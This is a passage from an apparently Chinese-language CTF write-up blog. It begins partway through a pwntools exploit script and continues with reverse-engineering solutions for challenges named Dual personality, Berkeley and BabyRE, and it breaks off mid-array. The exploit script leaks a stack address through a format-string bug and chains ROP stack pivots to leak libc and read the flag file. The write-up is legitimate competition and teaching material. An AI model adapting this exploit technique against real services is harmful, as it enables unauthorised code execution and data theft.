</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;tcp.cloud.dasctf.com&#34;</span>, <span style="color:#ae81ff">23625</span>)
</span></span><span style="display:flex;"><span>    libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc.so.6&#34;</span>)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">debugf</span>(b<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> debug:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> b:
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># gdb.attach(p,&#34;b *$rebase({b})&#34;.format(b = hex(b)))</span>
</span></span><span style="display:flex;"><span>            gdb<span style="color:#f92672">.</span>attach(p,<span style="color:#e6db74">&#34;b *(</span><span style="color:#e6db74">{b}</span><span style="color:#e6db74">)&#34;</span><span style="color:#f92672">.</span>format(b <span style="color:#f92672">=</span> hex(b)))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            gdb<span style="color:#f92672">.</span>attach(p)
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./pwn&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ru <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : p<span style="color:#f92672">.</span>recvuntil(x)
</span></span><span style="display:flex;"><span>sn <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : p<span style="color:#f92672">.</span>send(x)
</span></span><span style="display:flex;"><span>rl <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> : p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>sl <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : p<span style="color:#f92672">.</span>sendline(x)
</span></span><span style="display:flex;"><span>rv <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : p<span style="color:#f92672">.</span>recv(x)
</span></span><span style="display:flex;"><span>sa <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> a,b : p<span style="color:#f92672">.</span>sendafter(a,b)
</span></span><span style="display:flex;"><span>sla <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> a,b : p<span style="color:#f92672">.</span>sendlineafter(a, b)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># debugf(0x401373)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000401413</span>
</span></span><span style="display:flex;"><span>pop_rsi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000401411</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%p&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Hello, &#34;</span>)
</span></span><span style="display:flex;"><span>stack_address<span style="color:#f92672">=</span>int(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;N&#34;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>decode(),<span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>print(hex(stack_address))
</span></span><span style="display:flex;"><span><span style="color:#75715e"># u64([-6:].ljust(8, b&#34;\x00&#34;)) </span>
</span></span><span style="display:flex;"><span>leave <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4013A2</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> p64(pop_rdi) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x404028</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x4010E0</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x401150</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;e&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x90</span> <span style="color:#f92672">+</span> p64(stack_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>) <span style="color:#f92672">+</span> p64(leave)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(payload)
</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x7f</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>:]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)) <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;puts&#34;</span>]
</span></span><span style="display:flex;"><span>print(hex(libc<span style="color:#f92672">.</span>address))
</span></span><span style="display:flex;"><span>payload2 <span style="color:#f92672">=</span> p64(pop_rdi) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x4040B0</span>) <span style="color:#f92672">+</span> p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;gets&#34;</span>]) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x401150</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;e&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x90</span> <span style="color:#f92672">+</span> p64(stack_address <span style="color:#f92672">-</span><span style="color:#ae81ff">0x180</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>) <span style="color:#f92672">+</span> p64(leave)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(payload2)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Successfully~&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;./flag</span><span style="color:#ae81ff">\x00\x00\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload3 <span style="color:#f92672">=</span> p64(pop_rdi) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x4040b0</span>) <span style="color:#f92672">+</span> p64(pop_rsi) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;open&#34;</span>]) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x401150</span>)<span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;e&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x78</span> <span style="color:#f92672">+</span> p64(stack_address <span style="color:#f92672">-</span><span style="color:#ae81ff">0x300</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>) <span style="color:#f92672">+</span> p64(leave)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># payload = p64(pop_rdi) + p64(0x404028) + p64(0x4010E0) + p64(0x401150) + b&#34;e&#34;*0x90 + p64(stack_address - 0x300 + 0x8) + p64(leave)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># p.send(payload)</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(payload3)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload4 <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x40140A</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">3</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x4040e0</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x40</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x404048</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x4013F0</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">56</span> 
</span></span><span style="display:flex;"><span>payload4 <span style="color:#f92672">+=</span> p64(pop_rdi) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;write&#34;</span>])
</span></span><span style="display:flex;"><span>payload4 <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x401150</span>)<span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;e&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x18</span> <span style="color:#f92672">+</span> p64(stack_address <span style="color:#f92672">-</span><span style="color:#ae81ff">0x460</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>) <span style="color:#f92672">+</span> p64(leave)
</span></span><span style="display:flex;"><span>print(len(payload4))
</span></span><span style="display:flex;"><span>print(len(payload3))
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(payload4)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h2 id="reverse">Reverse</h2>
<h3 id="dual-personality">Dual personality</h3>
<p>程序设计了天堂之门转换架构，在函数401120后会从x86架构转为x64,同时函数401120会处理地址407050，将其填为一个给定的函数地址
<figure 
	
		class="gallery-image" 
		style="
			flex-grow: 172; 
			flex-basis: 414px"
	>
	<a href="/post/xhlj-writeup-by-or4nge/img/re1.png" data-size="738x427">
		<img src="/post/xhlj-writeup-by-or4nge/img/re1.png"
			width="738"
			height="427"
			srcset="/post/xhlj-writeup-by-or4nge/img/re1_hu28578b5edf2959d7cca7e513aa48c1f9_40291_480x0_resize_box_3.png 480w, /post/xhlj-writeup-by-or4nge/img/re1_hu28578b5edf2959d7cca7e513aa48c1f9_40291_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure>
那么分析整个main函数的流程（4013a0~4015ee）可得：
4013d4在x86架构下进行了输入操作；
4013e3在x64架构下将后文将要用到的值（这里称作delta）做了初始化；
4013f4~40144a在x86架构下进行了第一次加密；
401455在x64架构下进行了第二次加密（做循环左移）；
401462在x64架构下对异或的key进行处理；
40146e~4014ba在x64架构下进行了第三次加密（异或）；
最后与已知密文进行了比较。
按照流程逆序写出解密过程即可</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>cipher<span style="color:#f92672">=</span>[<span style="color:#ae81ff">0x0AA</span>,<span style="color:#ae81ff">0x4F</span>,<span style="color:#ae81ff">0x0F</span>,<span style="color:#ae81ff">0x0E2</span>,<span style="color:#ae81ff">0x0E4</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x99</span>,<span style="color:#ae81ff">0x54</span>,<span style="color:#ae81ff">0x2C</span>,<span style="color:#ae81ff">0x2B</span>,<span style="color:#ae81ff">0x84</span>,<span style="color:#ae81ff">0x7E</span>,<span style="color:#ae81ff">0x0BC</span>,<span style="color:#ae81ff">0x8F</span>,<span style="color:#ae81ff">0x8B</span>,<span style="color:#ae81ff">0x78</span>,<span style="color:#ae81ff">0x0D3</span>,<span style="color:#ae81ff">0x73</span>,<span style="color:#ae81ff">0x88</span>,<span style="color:#ae81ff">0x5E</span>,<span style="color:#ae81ff">0x0AE</span>,<span style="color:#ae81ff">0x47</span>,<span style="color:#ae81ff">0x85</span>,<span style="color:#ae81ff">0x70</span>,<span style="color:#ae81ff">0x31</span>,<span style="color:#ae81ff">0x0B3</span>,<span style="color:#ae81ff">0x9</span>,<span style="color:#ae81ff">0x0CE</span>,<span style="color:#ae81ff">0x13</span>,<span style="color:#ae81ff">0x0F5</span>,<span style="color:#ae81ff">0x0D</span>,<span style="color:#ae81ff">0x0CA</span>]
</span></span><span style="display:flex;"><span>print(len(cipher))
</span></span><span style="display:flex;"><span>key<span style="color:#f92672">=</span>[<span style="color:#ae81ff">0x9d</span>,<span style="color:#ae81ff">0x44</span>,<span style="color:#ae81ff">0x37</span>,<span style="color:#ae81ff">0xb5</span>]
</span></span><span style="display:flex;"><span>key[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">&amp;=</span>key[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>key[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">|=</span>key[<span style="color:#ae81ff">2</span>]
</span></span><span style="display:flex;"><span>key[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">^=</span>key[<span style="color:#ae81ff">3</span>]
</span></span><span style="display:flex;"><span>key[<span style="color:#ae81ff">3</span>]<span style="color:#f92672">=</span>(<span style="color:#f92672">~</span>key[<span style="color:#ae81ff">3</span>])<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xff</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">32</span>):
</span></span><span style="display:flex;"><span>    cipher[i]<span style="color:#f92672">^=</span>key[i<span style="color:#f92672">%</span><span style="color:#ae81ff">4</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">ror</span>(a,b,c<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> (a<span style="color:#f92672">&gt;&gt;</span>b)<span style="color:#f92672">|</span>((a<span style="color:#f92672">&lt;&lt;</span>(c<span style="color:#f92672">-</span>b))<span style="color:#f92672">&amp;</span>((<span style="color:#ae81ff">1</span><span style="color:#f92672">&lt;&lt;</span>c)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>))
</span></span><span style="display:flex;"><span>cipher<span style="color:#f92672">=</span>[int<span style="color:#f92672">.</span>from_bytes(bytes(cipher[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>]),<span style="color:#e6db74">&#39;little&#39;</span>) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">32</span>,<span style="color:#ae81ff">8</span>)]
</span></span><span style="display:flex;"><span>cipher[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">=</span>ror(cipher[<span style="color:#ae81ff">0</span>],<span style="color:#ae81ff">12</span>)
</span></span><span style="display:flex;"><span>cipher[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">=</span>ror(cipher[<span style="color:#ae81ff">1</span>],<span style="color:#ae81ff">34</span>)
</span></span><span style="display:flex;"><span>cipher[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">=</span>ror(cipher[<span style="color:#ae81ff">2</span>],<span style="color:#ae81ff">56</span>)
</span></span><span style="display:flex;"><span>cipher[<span style="color:#ae81ff">3</span>]<span style="color:#f92672">=</span>ror(cipher[<span style="color:#ae81ff">3</span>],<span style="color:#ae81ff">14</span>)
</span></span><span style="display:flex;"><span>cipher<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join([i<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">8</span>,<span style="color:#e6db74">&#39;little&#39;</span>) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> cipher])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>delta<span style="color:#f92672">=</span><span style="color:#ae81ff">0x5DF966AE</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x21524111</span>
</span></span><span style="display:flex;"><span>cipher<span style="color:#f92672">=</span>[int<span style="color:#f92672">.</span>from_bytes(cipher[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>],<span style="color:#e6db74">&#39;little&#39;</span>) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">32</span>,<span style="color:#ae81ff">4</span>)]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
</span></span><span style="display:flex;"><span>    delta_next<span style="color:#f92672">=</span>delta<span style="color:#f92672">^</span>cipher[i]
</span></span><span style="display:flex;"><span>    cipher[i]<span style="color:#f92672">-=</span>delta
</span></span><span style="display:flex;"><span>    cipher[i]<span style="color:#f92672">&amp;=</span><span style="color:#ae81ff">0xffffffff</span>
</span></span><span style="display:flex;"><span>    delta<span style="color:#f92672">=</span>delta_next
</span></span><span style="display:flex;"><span>text<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join([i<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">4</span>,<span style="color:#e6db74">&#39;little&#39;</span>) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> cipher])
</span></span><span style="display:flex;"><span>print(text)
</span></span></code></pre></div><h3 id="berkeley">Berkeley</h3>
<p>程序包含调试信息，注释中含有源码。提取ebpf字节码逆向发现和源码对应。加密逻辑十分简单，直接Z3求解。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>key_hex <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;C1D10261D6F713A29B20D04A8F7FEEB9006334B033B78A8B94602E8E21FF9082D587967822B6486C45C75A1680FDE48CBF011F4B7924A0B4234D3BC55D6F0DC9D4CA55E039AD2BCD2CECC26B30E60CA89A2FF6E8BB3257FB0B9DF23FB5F959E510CF5141E950DF267458CB645473ABF4B29F18F84EFE081D4F49D3AC3812771169071C99B3E73D05D8FC704693096589B1C652FAD20EA917E391A1685B2AF0C342CC29DEDC8598315CBC2DEF5E7EAF6762A75688A44340E1379E36767184BD068D477D53D7C8CE1592954C286D75EB7CF3BEAAB8ED033C273E19DDA666251EC46EC0E2DB3AD981A51BF504AEBAEA97833544A37A1AF186DA7B14729C6A0F5F0A00&#39;</span>
</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> bytearray<span style="color:#f92672">.</span>fromhex(key_hex)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>cipher_hex <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;F327471B8F09FB177048B05332DBC0B8632D404BF516F035E7DFEAA29C41B325D70C339C7B5ACD13BBEE3E0EF2CF35DAAFA2667D3837671E1F6B7B300B7A02A9C8612741DB0122316FB6D41B04D394B846C724CFBDAF0BDC2EBBB271F4995736D1955292BA6DF33050599BEA2F83DCF0DE57A1ACD251A21D59A800B6E265410C4FEBF02E582A1FF49572887CA90ECB3C42B9F3499B529812A31751C059400ABCE84C04FB130A173FE63697DFB3E2427FF8CC0ED177C4A84648E3F10AEF9456545BCABDDD7F5647C299FA89CCE1B93A78E23758011BC34BE68CF3E5B6719E63AF11CE87F66EDEC8B1D07A156C1008997B2255107A8273FC62CB34A7B762FA6B9F&#39;</span>
</span></span><span style="display:flex;"><span>cipher <span style="color:#f92672">=</span> bytearray<span style="color:#f92672">.</span>fromhex(cipher_hex)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>fake_cipher_hex <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;2095209580AAFFC04AAE8A5C0D8D1F6D0D8DA215EEF34DC87F7523CED150C1DF&#39;</span>
</span></span><span style="display:flex;"><span>fake_cipher <span style="color:#f92672">=</span> bytearray<span style="color:#f92672">.</span>fromhex(fake_cipher_hex)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> z3 <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> Solver()
</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> [BitVec((<span style="color:#e6db74">&#39;x</span><span style="color:#e6db74">%d</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> i), <span style="color:#ae81ff">8</span>) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">32</span>)]
</span></span><span style="display:flex;"><span>arr <span style="color:#f92672">=</span> [BitVec((<span style="color:#e6db74">&#39;arr</span><span style="color:#e6db74">%d</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> i), <span style="color:#ae81ff">8</span>) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>)]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>):
</span></span><span style="display:flex;"><span>    idx1 <span style="color:#f92672">=</span> key<span style="color:#f92672">.</span>index(cipher[i]) <span style="color:#f92672">^</span> key[i]
</span></span><span style="display:flex;"><span>    idx2 <span style="color:#f92672">=</span> key<span style="color:#f92672">.</span>index(idx1)
</span></span><span style="display:flex;"><span>    uc1 <span style="color:#f92672">=</span> flag[i<span style="color:#f92672">//</span><span style="color:#ae81ff">8</span>]
</span></span><span style="display:flex;"><span>    uc2 <span style="color:#f92672">=</span> (<span style="color:#f92672">~</span>(flag[i<span style="color:#f92672">//</span><span style="color:#ae81ff">8</span>] <span style="color:#f92672">+</span> arr[i<span style="color:#f92672">%</span><span style="color:#ae81ff">8</span>]))<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xff</span>
</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>add(uc1 <span style="color:#f92672">^</span> uc2 <span style="color:#f92672">==</span> idx2)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">32</span>):
</span></span><span style="display:flex;"><span>  s<span style="color:#f92672">.</span>add(flag[i] <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">47</span>)
</span></span><span style="display:flex;"><span>  s<span style="color:#f92672">.</span>add(flag[i] <span style="color:#f92672">&lt;=</span><span style="color:#ae81ff">122</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> s<span style="color:#f92672">.</span>check()<span style="color:#f92672">==</span>sat:
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;sat&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">32</span>):
</span></span><span style="display:flex;"><span>      print(str(s<span style="color:#f92672">.</span>model()[flag[i]])<span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;, &#39;</span>, end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>l <span style="color:#f92672">=</span> [<span style="color:#ae81ff">55</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">99</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">97</span>, <span style="color:#ae81ff">99</span>, <span style="color:#ae81ff">57</span>, <span style="color:#ae81ff">56</span>, <span style="color:#ae81ff">97</span>, <span style="color:#ae81ff">99</span>, <span style="color:#ae81ff">56</span>, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">57</span>, <span style="color:#ae81ff">57</span>, <span style="color:#ae81ff">97</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">101</span>, <span style="color:#ae81ff">56</span>, <span style="color:#ae81ff">97</span>, <span style="color:#ae81ff">57</span>, <span style="color:#ae81ff">53</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">52</span>, <span style="color:#ae81ff">52</span>, <span style="color:#ae81ff">57</span>, <span style="color:#ae81ff">97</span>, <span style="color:#ae81ff">55</span>, <span style="color:#ae81ff">51</span>, <span style="color:#ae81ff">57</span>, <span style="color:#ae81ff">51</span>]
</span></span><span style="display:flex;"><span>res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(l)):
</span></span><span style="display:flex;"><span>  res <span style="color:#f92672">+=</span> chr(l[i])
</span></span><span style="display:flex;"><span>print(res)
</span></span></code></pre></div><h3 id="babyre">BabyRE</h3>
<p>此程序在preinitialize阶段就完成了整个流程，分析40615c所在的三个函数即可
<figure 
	
		class="gallery-image" 
		style="
			flex-grow: 824; 
			flex-basis: 1978px"
	>
	<a href="/post/xhlj-writeup-by-or4nge/img/re2.png" data-size="1212x147">
		<img src="/post/xhlj-writeup-by-or4nge/img/re2.png"
			width="1212"
			height="147"
			srcset="/post/xhlj-writeup-by-or4nge/img/re2_hu4ddecdd44ad59cfecd1361bb275da944_28302_480x0_resize_box_3.png 480w, /post/xhlj-writeup-by-or4nge/img/re2_hu4ddecdd44ad59cfecd1361bb275da944_28302_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure>
401000输入，并用atexit存了一个rc4加密的函数
401050做初始化，并用atexit存了一个sha1算法
4010c0用atexit存了一个base编码算法
按照atexit的性质，它们应当从后往前执行，即先编码，再做sha1（但此处的sha1仅是一个校验，并不算中间过程），再进行rc4.
经过分析可知，rc4加密的密钥由输入得来，当输入超过42个字符时，超出的六个字符即是rc4的密钥
<figure 
	
		class="gallery-image" 
		style="
			flex-grow: 831; 
			flex-basis: 1996px"
	>
	<a href="/post/xhlj-writeup-by-or4nge/img/re3.png" data-size="998x120">
		<img src="/post/xhlj-writeup-by-or4nge/img/re3.png"
			width="998"
			height="120"
			srcset="/post/xhlj-writeup-by-or4nge/img/re3_hu874b16a78bcdd5c71ca92c3c585b12b6_20819_480x0_resize_box_3.png 480w, /post/xhlj-writeup-by-or4nge/img/re3_hu874b16a78bcdd5c71ca92c3c585b12b6_20819_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure>
根据输入限制，密钥在0~9之间，且后96位的明密文对是已知的，直接爆破</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>s<span style="color:#f92672">=</span>[i <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>)]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>cipher<span style="color:#f92672">=</span>[<span style="color:#ae81ff">0x3F</span>, <span style="color:#ae81ff">0x95</span>, <span style="color:#ae81ff">0xBB</span>, <span style="color:#ae81ff">0xF2</span>, <span style="color:#ae81ff">0x57</span>, <span style="color:#ae81ff">0xF1</span>, <span style="color:#ae81ff">0x7A</span>, <span style="color:#ae81ff">0x5A</span>, <span style="color:#ae81ff">0x22</span>, <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0x51</span>, <span style="color:#ae81ff">0x43</span>, <span style="color:#ae81ff">0xA2</span>, <span style="color:#ae81ff">0xFA</span>, <span style="color:#ae81ff">0x9B</span>, <span style="color:#ae81ff">0x6F</span>, <span style="color:#ae81ff">0x44</span>, <span style="color:#ae81ff">0x63</span>, <span style="color:#ae81ff">0xC0</span>, <span style="color:#ae81ff">0x08</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x5C</span>, <span style="color:#ae81ff">0x8A</span>, <span style="color:#ae81ff">0x8C</span>, <span style="color:#ae81ff">0x4C</span>, <span style="color:#ae81ff">0xED</span>, <span style="color:#ae81ff">0x5E</span>, <span style="color:#ae81ff">0xCA</span>, <span style="color:#ae81ff">0x76</span>, <span style="color:#ae81ff">0xB9</span>, <span style="color:#ae81ff">0x85</span>, <span style="color:#ae81ff">0xAF</span>, <span style="color:#ae81ff">0x05</span>, <span style="color:#ae81ff">0x38</span>, <span style="color:#ae81ff">0xED</span>, <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0x3E</span>, <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0xDF</span>, <span style="color:#ae81ff">0x5D</span>, <span style="color:#ae81ff">0xBE</span>, <span style="color:#ae81ff">0x05</span>, <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x35</span>, <span style="color:#ae81ff">0x6D</span>, <span style="color:#ae81ff">0xF3</span>, <span style="color:#ae81ff">0x1C</span>, <span 